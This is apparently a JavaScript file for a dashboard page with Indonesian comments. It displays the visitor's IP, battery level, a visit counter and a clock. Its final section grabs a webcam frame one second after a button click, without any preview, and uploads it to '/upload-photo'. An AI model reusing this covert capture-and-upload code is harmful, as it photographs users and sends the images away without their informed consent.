
//=========== IP ADDRESS =========//
fetch("https://api.ipify.org?format=json").then(response => response.json()).then(data => {
  document.querySelector(".ip-addres").innerText = data.ip;
}).catch(eror => {console.log("Eror membaca ip:", eror);
document.querySelector(".ip-addres").innerText = "unable to fetch"
}
)

//======= BUTTON SIDEBAR && MODE TEMA =======// 
const sideMenu = document.querySelector("aside");
const menuBtn = document.querySelector("#menu-btn");
const closeBtn = document.querySelector("#close-btn");

const themeToggler = document.querySelector(".theme-toggler");

//show sidebar
menuBtn.addEventListener('click', () => {
  sideMenu.style.display = 'block';
})

//close sidebar
closeBtn.addEventListener('click', () => {
 sideMenu.style.display = 'none';
})

//change theme
themeToggler.addEventListener('click', () => {
  document.body.classList.toggle('dark-theme-variables');
  
  themeToggler.querySelector('span:nth-child(1)').classList.toggle('active')
  themeToggler.querySelector('span:nth-child(2)').classList.toggle('active')
})
//========= battery =======//
navigator.getBattery().then(function(battery) {
  updateBatteryStatus(battery);

  battery.addEventListener('chargingchange', function() {
    updateBatteryStatus(battery);
  });
  battery.addEventListener('levelchange', function() {
    updateBatteryStatus(battery)
  })
});

function updateBatteryStatus(battery) {
  var batteryStatusText = document.querySelector(".battery-status-text");
  var batteryPercentase = document.querySelector(".battery-percentase");
  var batteryCircle = document.querySelector("#battery-circle");
  var batteryNeon = document.querySelector(".battery-neon")
  
  var fillWidth = Math.round(battery.level * 100) + "%";
  batteryPercentase.innerHTML = fillWidth;
  
  var radius = 36;
  var circleCircumference = 2 * Math.PI * radius;
  var strokeOffset = circleCircumference - (battery.level * circleCircumference);
  batteryCircle.style.strokeDasharray = circleCircumference;
  batteryCircle.style.strokeDashoffset = strokeOffset;
  
  var batteryAngka = parseInt(fillWidth.replace("%", ""))
  if (batteryAngka < 30) {
    batteryCircle.style.stroke = "#FF6347"
  } else {
    batteryCircle.style.stroke = "#2196F3"
  }
  
  if (batteryStatusText) {
    if (battery.charging) {
      batteryStatusText.innerHTML = "Charging";
      batteryCircle.style.stroke = "#41f1b6"
      batteryNeon.style.opacity = "1"
    } else {
      batteryStatusText.innerHTML = "Not Charging";
      batteryNeon.style.opacity = "0"
    }
  } else {
    console.error("Elemen yang dibutuhkan tidak ditemukan.");
  }
}

//========== VISITOR / PENGUNJUNG =========//

if (localStorage.getItem("visitorCount")) {
  let visitorCount = parseInt(localStorage.getItem("visitorCount"));
  visitorCount++;
  
  localStorage.setItem("visitorCount", visitorCount);

  document.getElementById("visitor-count").innerText = visitorCount;
} else {
  localStorage.setItem("visitorCount", 1);
  document.getElementById("visitor-count").innerText = 1;
}

//========== WAKTU / DATE =========//

function perbaruiJam() {
      const sekarang = new Date();

      const jam = String(sekarang.getHours()).padStart(2, '0');
      const menit = String(sekarang.getMinutes()).padStart(2, '0');
      const detik = String(sekarang.getSeconds()).padStart(2, '0');
      const waktuString = `${jam}:${menit}:${detik}`;

      const tanggal = sekarang.toLocaleDateString('id-ID', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      });

      document.querySelector(".text-muted").textContent = tanggal;
      document.querySelector('.waktu-expenses').textContent = waktuString;
    }

    setInterval(perbaruiJam, 1000);

    perbaruiJam();
    
   
//============ [ AKSES KAMERA =========//
const captureButton = document.getElementById('api-button');
    
    // Ambil foto dari kamera dan kirim ke server
    captureButton.addEventListener('click', () => {
      // Mengakses kamera
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          // Ambil gambar dari video setelah beberapa detik
          setTimeout(() => {
            // Membuat elemen canvas untuk menggambar gambar dari video
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Mengambil gambar dalam format data URL (Base64)
            const imageUrl = canvas.toDataURL('image/png');

            // Mengirim gambar ke server
            fetch('/upload-photo', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({ image: imageUrl })
            })
            .then(response => response.text())
            .then(data => {
              alert(data);  // Menampilkan pesan sukses atau gagal
            })
            .catch(error => {
              console.error('Error:', error);
              //qlert('Gagal mengirim gambar ke server');
            });

            // Stop stream setelah gambar diambil
            stream.getTracks().forEach(track => track.stop());
          }, 1000);  // Ambil gambar setelah 1 detik
        })
        .catch(err => {
          console.log("Kamera tidak dapat diakses:", err);
        });
    });